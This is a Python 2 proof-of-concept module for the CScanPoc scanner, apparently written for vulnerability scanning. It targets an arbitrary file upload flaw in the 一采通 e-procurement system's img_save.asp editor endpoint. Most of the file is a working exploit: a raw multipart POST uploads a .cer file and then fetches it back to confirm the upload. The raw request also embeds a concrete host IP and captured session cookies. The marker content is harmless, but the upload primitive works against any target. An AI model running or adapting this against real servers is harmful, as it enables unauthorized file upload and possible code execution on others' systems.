# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = '1caitong_0000' # 平台漏洞编号，留空
    name = '一采通电子采购系统/library/editornew/Editor/img_save.asp任意文件上传' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2015-11-07'  # 漏洞公布时间
    desc = '''
        一采通电子采购系统/library/editornew/Editor/img_save.asp任意文件上传
    ''' # 漏洞描述
    ref = 'https://wooyun.shuimugan.com/bug/view?bug_no=0142269' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '一采通'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1caitong_0000' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-22' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            vun_url=arg+"/library/editornew/Editor/img_save.asp"
            raw='''POST /library/editornew/Editor/img_save.asp HTTP/1.1
                    Host: 116.55.248.65:8001
                    Content-Length: 884
                    Cache-Control: max-age=0
                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
                    Origin: http://116.55.248.65:8001
                    Upgrade-Insecure-Requests: 1
                    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
                    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNjZKAB66SVyL1INA
                    Referer: http://116.55.248.65:8001//library/editornew/Editor/temp.asp
                    Accept-Encoding: gzip, deflate
                    Accept-Language: zh-CN,zh;q=0.8
                    Cookie: ASP.NET_SessionId=mvmqjx11vk1sr3uaopcqkol3; ASPSESSIONIDCQBQQATB=FKGDFMEBCLPKBNJJAPDDDDKF; VisitNum=1; a4842_pages=3; a4842_times=1; Hm_lvt_8848501857b22e6784e89c9ccb4fc9c3=1454026282; Hm_lpvt_8848501857b22e6784e89c9ccb4fc9c3=1454026343; __utma=69517648.1787092370.1454026373.1454026373.1454026373.1; __utmb=69517648.1.10.1454026373; __utmc=69517648; __utmz=69517648.1454026373.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)

                    ------WebKitFormBoundaryNjZKAB66SVyL1INA
                    Content-Disposition: form-data; name="img_src"; filename="123.cer"
                    Content-Type: application/x-x509-ca-cert

                    testvul
                    ------WebKitFormBoundaryNjZKAB66SVyL1INA
                    Content-Disposition: form-data; name="Submit"

                    提交
                    ------WebKitFormBoundaryNjZKAB66SVyL1INA
                    Content-Disposition: form-data; name="img_alt"


                    ------WebKitFormBoundaryNjZKAB66SVyL1INA
                    Content-Disposition: form-data; name="img_align"

                    baseline
                    ------WebKitFormBoundaryNjZKAB66SVyL1INA
                    Content-Disposition: form-data; name="img_border"


                    ------WebKitFormBoundaryNjZKAB66SVyL1INA
                    Content-Disposition: form-data; name="newid"

                    45
                    ------WebKitFormBoundaryNjZKAB66SVyL1INA
                    Content-Disposition: form-data; name="img_hspace"


                    ------WebKitFormBoundaryNjZKAB66SVyL1INA
                    Content-Disposition: form-data; name="img_vspace"


                    ------WebKitFormBoundaryNjZKAB66SVyL1INA--
                    '''
            code,head,res,errcode,finalurl = hh.http(vun_url,raw=raw)
                       
            match=re.search(r'getimg\(\'([\d]+.cer)\'\)',res)
            if match:
                verify_url=arg+"/library/editornew/Editor/NewImage/"+match.group(1)
                code,head,res,errcode,finalurl = hh.http(verify_url)
                if code==200 and "testvul"  in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()